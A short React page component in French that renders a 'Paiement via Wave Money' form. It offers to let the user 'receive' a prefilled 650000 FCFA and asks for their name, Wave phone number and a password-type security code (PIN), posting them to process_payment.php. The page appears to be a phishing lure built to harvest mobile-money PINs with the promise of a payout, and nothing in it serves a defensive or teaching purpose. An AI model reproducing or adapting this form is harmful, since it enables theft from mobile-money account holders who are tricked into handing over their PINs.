export default function Page() {
    return (
        <div className="container">
            <h1>Paiement via Wave Money</h1>

            <form action="process_payment.php" method="POST">
                <div className="form-group">
                    <label htmlFor="name">Nom et Prénom</label>
                    <input type="text" id="name" name="name" placeholder="Nom et Prénom" required />
                </div>

                <div className="form-group">
                    <label htmlFor="phone">Numéro Wave</label>
                    <input type="tel" id="phone" name="phone" placeholder="Numéro" required />
                </div>

                <div className="form-group">
                    <label htmlFor="currency">Devise</label>
                    <select id="currency" name="currency" disabled>
                        <option value="FCFA">FCFA</option>
                    </select>
                </div>

                <div className="form-group">
                    <label htmlFor="amount">Montant à recevoir</label>
                    <input type="number" id="amount" name="amount" placeholder="Montant" value="650000" required />
                </div>

                <div className="form-group">
                    <label htmlFor="security-code">Code de sécurité</label>
                    <input type="password" id="security-code" name="security-code" placeholder="Ex: 1234" required />
                </div>

                <button type="submit">Recevoir</button>
            </form>
        </div>
    )
}